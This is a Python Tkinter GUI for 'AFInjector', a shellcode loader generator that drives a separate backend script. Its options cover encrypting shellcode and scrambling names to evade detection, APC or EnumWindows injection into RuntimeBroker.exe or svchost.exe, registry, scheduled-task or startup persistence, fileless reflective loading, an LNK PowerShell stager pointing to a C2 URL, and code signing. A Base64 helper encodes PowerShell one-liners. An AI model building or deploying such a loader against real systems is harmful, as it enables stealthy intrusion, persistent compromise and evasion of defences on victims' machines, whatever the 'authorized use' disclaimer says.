#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import platform
import subprocess
import threading
import base64
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from tkinter.scrolledtext import ScrolledText

class Base64EncoderDialog(tk.Toplevel):
    """Simple dialog to encode a string to Base64 (UTF-16LE) and copy to clipboard."""
    def __init__(self, parent):
        super().__init__(parent)
        self.title("Base64 Encoder (UTF-16LE)")
        self.geometry("600x480")  # increased height
        self.minsize(500, 400)
        self.resizable(True, True)

        # Make modal
        self.transient(parent)
        self.grab_set()

        # Input frame
        input_frame = ttk.LabelFrame(self, text="Input Text (PowerShell command / one‑liner)")
        input_frame.pack(fill="both", expand=True, padx=10, pady=5)
        self.input_text = ScrolledText(input_frame, height=8, width=70)
        self.input_text.pack(fill="both", expand=True, padx=5, pady=5)

        # Output frame
        output_frame = ttk.LabelFrame(self, text="Base64 Encoded (UTF-16LE)")
        output_frame.pack(fill="both", expand=True, padx=10, pady=5)
        self.output_text = ScrolledText(output_frame, height=8, width=70)
        self.output_text.pack(fill="both", expand=True, padx=5, pady=5)

        # Buttons – use plain tk.Button with increased height and padding
        btn_frame = tk.Frame(self)
        btn_frame.pack(pady=15)  # more vertical space

        encode_btn = tk.Button(btn_frame, text="Encode", command=self.encode,
                               width=12, height=2, relief=tk.RAISED)
        encode_btn.pack(side="left", padx=5, pady=5)

        copy_btn = tk.Button(btn_frame, text="Copy to Clipboard", command=self.copy_to_clipboard,
                             width=15, height=2, relief=tk.RAISED)
        copy_btn.pack(side="left", padx=5, pady=5)

        close_btn = tk.Button(btn_frame, text="Close", command=self.destroy,
                              width=8, height=2, relief=tk.RAISED)
        close_btn.pack(side="left", padx=5, pady=5)

        self.bind('<Control-Return>', lambda e: self.encode())
        self.bind('<Escape>', lambda e: self.destroy())

    def encode(self):
        text = self.input_text.get("1.0", tk.END).strip()
        if not text:
            messagebox.showwarning("No input", "Please enter some text to encode.")
            return
        try:
            encoded = base64.b64encode(text.encode('utf-16le')).decode('ascii')
            self.output_text.delete("1.0", tk.END)
            self.output_text.insert("1.0", encoded)
            self.output_text.tag_add("sel", "1.0", "end")
        except Exception as e:
            messagebox.showerror("Encoding Error", str(e))

    def copy_to_clipboard(self):
        encoded = self.output_text.get("1.0", tk.END).strip()
        if encoded:
            self.clipboard_clear()
            self.clipboard_append(encoded)
            messagebox.showinfo("Copied", "Base64 string copied to clipboard.")
        else:
            messagebox.showwarning("Nothing to copy", "Please encode some text first.")

class AnneFrankGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("AFInjector - GUI")
        self.root.geometry("820x1080")

        # Determine backend path (absolute)
        script_dir = os.path.dirname(os.path.abspath(__file__))
        if platform.system() == "Windows":
            self.backend = os.path.join(script_dir, "Windows", "main.py")
        else:
            self.backend = os.path.join(script_dir, "Linux", "main.py")

        if not os.path.isfile(self.backend):
            messagebox.showerror("Error", f"Backend not found: {self.backend}")
            sys.exit(1)

        # Create menu bar
        self.create_menu()

        main_frame = ttk.Frame(root, padding=12)
        main_frame.grid(row=0, column=0, sticky="nsew")
        root.columnconfigure(0, weight=1)
        root.rowconfigure(0, weight=1)

        # ---------- Shellcode file ----------
        row = 0
        ttk.Label(main_frame, text="Shellcode file:").grid(row=row, column=0, sticky="w")
        self.shellcode_path = tk.StringVar()
        ttk.Entry(main_frame, textvariable=self.shellcode_path, width=60).grid(row=row, column=1, columnspan=2, sticky="ew")
        ttk.Button(main_frame, text="Browse", command=self.browse_shellcode).grid(row=row, column=3)
        row += 1

        # ---------- Mode ----------
        ttk.Label(main_frame, text="Mode:").grid(row=row, column=0, sticky="w")
        self.mode = tk.StringVar(value="stageless")
        ttk.Radiobutton(main_frame, text="Stageless", variable=self.mode, value="stageless").grid(row=row, column=1, sticky="w")
        ttk.Radiobutton(main_frame, text="Staged", variable=self.mode, value="staged").grid(row=row, column=2, sticky="w")
        row += 1

        # ---------- Staged settings (hidden initially) ----------
        self.staged_frame = ttk.LabelFrame(main_frame, text="Staged Settings")
        self.staged_frame.grid(row=row, column=0, columnspan=4, sticky="ew", pady=6)
        self.staged_frame.grid_remove()
        staged_row = 0
        ttk.Label(self.staged_frame, text="IP:").grid(row=staged_row, column=0, sticky="w")
        self.ip = tk.StringVar()
        ttk.Entry(self.staged_frame, textvariable=self.ip, width=20).grid(row=staged_row, column=1, padx=5)
        staged_row += 1
        ttk.Label(self.staged_frame, text="Port:").grid(row=staged_row, column=0, sticky="w")
        self.port = tk.StringVar()
        ttk.Entry(self.staged_frame, textvariable=self.port, width=10).grid(row=staged_row, column=1, padx=5)
        staged_row += 1
        ttk.Label(self.staged_frame, text="Path:").grid(row=staged_row, column=0, sticky="w")
        self.path = tk.StringVar(value="/")
        ttk.Entry(self.staged_frame, textvariable=self.path, width=30).grid(row=staged_row, column=1, padx=5)
        row += 1

        # ---------- Common options ----------
        self.encrypt = tk.BooleanVar(value=True)
        ttk.Checkbutton(main_frame, text="Encrypt shellcode", variable=self.encrypt).grid(row=row, column=0, columnspan=4, sticky="w")
        row += 1

        self.scramble = tk.BooleanVar(value=True)
        ttk.Checkbutton(main_frame, text="Scramble names", variable=self.scramble).grid(row=row, column=0, columnspan=4, sticky="w")
        row += 1

        # ---------- PowerShell Ready ----------
        self.prepare_ps_frame = ttk.Frame(main_frame)
        self.prepare_ps_frame.grid(row=row, column=0, columnspan=4, sticky="w")
        self.prepare_ps = tk.BooleanVar()
        self.ps_checkbox = ttk.Checkbutton(self.prepare_ps_frame, text="Prepare PowerShell-ready Base64 (BIN only)", variable=self.prepare_ps)
        self.ps_checkbox.grid(row=0, column=0, sticky="w")
        row += 1

        # ---------- Debug Encryption ----------
        self.debug_frame = ttk.Frame(main_frame)
        self.debug_frame.grid(row=row, column=0, columnspan=4, sticky="w")
        self.debug_encrypt = tk.BooleanVar()
        self.debug_checkbox = ttk.Checkbutton(self.debug_frame, text="Show encryption debug info (BIN only)", variable=self.debug_encrypt)
        self.debug_checkbox.grid(row=0, column=0, sticky="w")
        row += 1

        # ---------- Format ----------
        ttk.Label(main_frame, text="Format:").grid(row=row, column=0, sticky="w")
        self.format = tk.StringVar(value="EXE")
        ttk.Radiobutton(main_frame, text="EXE", variable=self.format, value="EXE", command=self.toggle_ps_ready).grid(row=row, column=1, sticky="w")
        ttk.Radiobutton(main_frame, text="DLL", variable=self.format, value="DLL", command=self.toggle_ps_ready).grid(row=row, column=2, sticky="w")
        ttk.Radiobutton(main_frame, text="BIN", variable=self.format, value="BIN", command=self.toggle_ps_ready).grid(row=row, column=3, sticky="w")
        row += 1

        # ---------- APC target ----------
        ttk.Label(main_frame, text="APC Target:").grid(row=row, column=0, sticky="w")
        self.apc = tk.StringVar(value="RuntimeBroker.exe")
        ttk.Combobox(main_frame, textvariable=self.apc, values=["RuntimeBroker.exe", "svchost.exe"], width=25).grid(row=row, column=1, sticky="w")
        row += 1

        # ---------- Persistence ----------
        ttk.Label(main_frame, text="Persistence:").grid(row=row, column=0, sticky="w")
        self.persistence = tk.StringVar(value="none")
        ttk.Combobox(main_frame, textvariable=self.persistence,
                     values=["none", "reg", "task", "startup"],
                     width=25, state="readonly").grid(row=row, column=1, sticky="w")
        row += 1

        # ---------- Output name ----------
        ttk.Label(main_frame, text="Output name:").grid(row=row, column=0, sticky="w")
        self.output_name = tk.StringVar(value="afloader")
        ttk.Entry(main_frame, textvariable=self.output_name, width=30).grid(row=row, column=1, sticky="w")
        row += 1

        # ---------- Delay & Spawn ----------
        ttk.Label(main_frame, text="Delay (sec):").grid(row=row, column=0, sticky="w")
        self.delay = tk.StringVar(value="0")
        ttk.Entry(main_frame, textvariable=self.delay, width=10).grid(row=row, column=1, sticky="w")
        row += 1

        self.spawn = tk.BooleanVar()
        ttk.Checkbutton(main_frame, text="Spawn process", variable=self.spawn).grid(row=row, column=0, sticky="w")
        self.spawn_path = tk.StringVar(value="C:\\Windows\\System32\\notepad.exe")
        ttk.Label(main_frame, text="Spawn path:").grid(row=row, column=1, sticky="w")
        ttk.Entry(main_frame, textvariable=self.spawn_path, width=40).grid(row=row, column=2, columnspan=2, sticky="ew")
        row += 1

        # ---------- Injection technique ----------
        ttk.Label(main_frame, text="Injection technique:").grid(row=row, column=0, sticky="w")
        self.injection = tk.StringVar(value="apc")
        ttk.Combobox(main_frame, textvariable=self.injection,
                     values=["apc", "enumwindows"], width=25, state="readonly").grid(row=row, column=1, sticky="w")
        row += 1

        # ---------- Staggered persistence ----------
        self.staggered = tk.BooleanVar()
        ttk.Checkbutton(main_frame, text="Staggered persistence (two-stage)", variable=self.staggered).grid(row=row, column=0, columnspan=4, sticky="w")
        row += 1

        # ---------- Reflective mode (fileless) ----------
        self.reflective = tk.BooleanVar()
        ttk.Checkbutton(main_frame, text="Reflective mode (no EXE)", variable=self.reflective).grid(row=row, column=0, columnspan=4, sticky="w")
        row += 1

        # ---------- LNK stager ----------
        self.lnk_stager = tk.BooleanVar()
        ttk.Checkbutton(main_frame, text="Generate LNK stager (PowerShell)", variable=self.lnk_stager).grid(row=row, column=0, columnspan=4, sticky="w")
        row += 1

        # ---------- C2 URL (for stager) ----------
        ttk.Label(main_frame, text="C2 URL (for stager):").grid(row=row, column=0, sticky="w")
        self.c2_url = tk.StringVar()
        ttk.Entry(main_frame, textvariable=self.c2_url, width=55).grid(row=row, column=1, columnspan=3, sticky="ew")
        row += 1

        # ---------- Code signing ----------
        signing_frame = ttk.LabelFrame(main_frame, text="Code Signing")
        signing_frame.grid(row=row, column=0, columnspan=4, sticky="ew", pady=8)
        signing_row = 0
        ttk.Label(signing_frame, text="Cert:").grid(row=signing_row, column=0, sticky="w")
        self.cert_source = tk.StringVar(value="none")
        ttk.Combobox(signing_frame, textvariable=self.cert_source, values=["none", "custom"], width=15, state="readonly").grid(row=signing_row, column=1, sticky="w")
        signing_row += 1
        self.pfx_path = tk.StringVar()
        self.pfx_pass = tk.StringVar()
        ttk.Label(signing_frame, text="PFX:").grid(row=signing_row, column=0, sticky="w")
        ttk.Entry(signing_frame, textvariable=self.pfx_path, width=50).grid(row=signing_row, column=1, padx=5)
        ttk.Button(signing_frame, text="Browse", command=self.browse_pfx).grid(row=signing_row, column=2)
        signing_row += 1
        ttk.Label(signing_frame, text="Pass:").grid(row=signing_row, column=0, sticky="w")
        ttk.Entry(signing_frame, textvariable=self.pfx_pass, show="*", width=30).grid(row=signing_row, column=1, sticky="w")
        row += 1

        # ---------- Generate button ----------
        self.gen_button = ttk.Button(main_frame, text="GENERATE LOADER", command=self.generate)
        self.gen_button.grid(row=row, column=0, columnspan=4, pady=15)
        row += 1

        # ---------- Output text area ----------
        ttk.Label(main_frame, text="Output:").grid(row=row, column=0, sticky="w")
        self.output_text = ScrolledText(main_frame, height=18)
        self.output_text.grid(row=row+1, column=0, columnspan=4, sticky="nsew")

        # Configure resizing
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(row+1, weight=1)

        self.mode.trace_add("write", self.toggle_staged)
        self.format.trace_add("write", lambda *args: self.toggle_ps_ready())

    def create_menu(self):
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)

        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="Base64 Encoder (UTF-16LE)", command=self.open_base64_encoder)

        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="About", command=self.show_about)

    def open_base64_encoder(self):
        Base64EncoderDialog(self.root)

    def show_about(self):
        messagebox.showinfo(
            "About AFInjector",
            "AFInjector v2.0\n"
            "AnneFrankInjector Edition\n"
            "Author: Excalibra\n"
            "GitHub: https://github.com/Excalibra\n\n"
            "Advanced shellcode loader with evasion techniques.\n"
            "Use responsibly and only on authorized systems."
        )

    def browse_shellcode(self):
        f = filedialog.askopenfilename(filetypes=[("Bin", "*.bin"), ("All", "*.*")])
        if f:
            self.shellcode_path.set(f)

    def browse_pfx(self):
        f = filedialog.askopenfilename(filetypes=[("PFX", "*.pfx")])
        if f:
            self.pfx_path.set(f)

    def toggle_staged(self, *args):
        if self.mode.get() == "staged":
            self.staged_frame.grid()
        else:
            self.staged_frame.grid_remove()
        self.toggle_ps_ready()

    def toggle_ps_ready(self):
        """Enable/disable PowerShell-ready and debug checkboxes based on format selection"""
        if self.format.get() == "BIN":
            self.ps_checkbox.config(state="normal")
            self.debug_checkbox.config(state="normal")
        else:
            self.ps_checkbox.config(state="disabled")
            self.debug_checkbox.config(state="disabled")
            self.prepare_ps.set(False)  # Uncheck when not BIN format
            self.debug_encrypt.set(False)  # Uncheck when not BIN format

    def generate(self):
        if not self.shellcode_path.get():
            messagebox.showerror("Error", "Select shellcode!")
            return
        self.gen_button.config(state="disabled")
        self.output_text.delete(1.0, tk.END)
        threading.Thread(target=self.run_backend, daemon=True).start()

    def run_backend(self):
        try:
            backend_abs = os.path.abspath(self.backend)
            backend_dir = os.path.dirname(backend_abs)
            backend_script = os.path.basename(backend_abs)
            xor_key = None  # Variable to store XOR key

            cmd = [sys.executable, backend_script, self.mode.get(),
                   "-p", self.shellcode_path.get(),
                   "-f", self.format.get(),
                   "-apc", self.apc.get(),
                   "-o", self.output_name.get()]

            if self.encrypt.get():
                cmd.append("-e")
            if self.scramble.get():
                cmd.append("-s")
            if self.persistence.get() != "none":
                cmd.extend(["--persistence", self.persistence.get()])
            if int(self.delay.get()) > 0:
                cmd.extend(["--delay", self.delay.get()])
            if self.spawn.get():
                cmd.append("--spawn")
                cmd.extend(["--spawn-path", self.spawn_path.get()])
            if self.injection.get() != "apc":
                cmd.extend(["--injection", self.injection.get()])
            if self.staggered.get():
                cmd.append("--staggered")
            if self.reflective.get():
                cmd.append("--reflective")
            if self.lnk_stager.get():
                cmd.append("--lnk-stager")
            if self.c2_url.get().strip():
                cmd.extend(["--c2-url", self.c2_url.get().strip()])
            if self.prepare_ps.get():
                cmd.append("--prepare-ps")
            if self.debug_encrypt.get():
                cmd.append("--debug-encrypt")

            if self.cert_source.get() != "none" and self.pfx_path.get():
                cmd.extend(["-pfx", self.pfx_path.get()])
                if self.pfx_pass.get():
                    cmd.extend(["-pfx-pass", self.pfx_pass.get()])

            if self.mode.get() == "staged":
                cmd.extend(["-i", self.ip.get(), "-po", self.port.get(), "-pa", self.path.get()])

            self.output_text.insert(tk.END, " ".join(cmd) + "\n" + "="*70 + "\n")
            self.root.update_idletasks()

            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, bufsize=1, cwd=backend_dir)

            for line in proc.stdout:
                # Highlight XOR key information in the output
                if "XOR Key:" in line:
                    # Extract XOR key value from the line
                    try:
                        xor_key = line.split("0x")[1].split(" ")[0]
                    except:
                        pass
                    
                    # Insert XOR key line with special formatting
                    start_pos = self.output_text.index(tk.END)
                    self.output_text.insert(tk.END, line)
                    end_pos = self.output_text.index(tk.END)
                    
                    # Add tag for XOR key line
                    self.output_text.tag_add("xor_key", start_pos, end_pos)
                    self.output_text.tag_config("xor_key", foreground="cyan", font=("Courier", 10, "bold"))
                else:
                    self.output_text.insert(tk.END, line)
                self.output_text.see(tk.END)
                self.root.update_idletasks()

            proc.wait()
            if proc.returncode == 0:
                # Create success message with XOR key if available
                success_msg = f"Done → {self.output_name.get()}.{self.format.get().lower()}"
                if xor_key:
                    success_msg += f"\n\nXOR Key: 0x{xor_key}"
                
                # Add PowerShell-ready file mention if --prepare-ps was used
                if self.prepare_ps.get() and self.format.get() == "BIN":
                    success_msg += f"\n\nPowerShell-ready file: {self.output_name.get()}_ready.txt"
                
                # Add debug file mention if --debug-encrypt was used
                if self.debug_encrypt.get() and self.format.get() == "BIN":
                    success_msg += f"\n\nDebug file: {self.output_name.get()}_raw_decrypted.bin"
                
                messagebox.showinfo("Success", success_msg)
            else:
                messagebox.showerror("Failed", "See output above")
        except Exception as e:
            self.output_text.insert(tk.END, f"ERROR: {e}\n")
            messagebox.showerror("Error", str(e))
        finally:
            self.gen_button.config(state="normal")


if __name__ == "__main__":
    root = tk.Tk()
    app = AnneFrankGUI(root)
    root.mainloop()
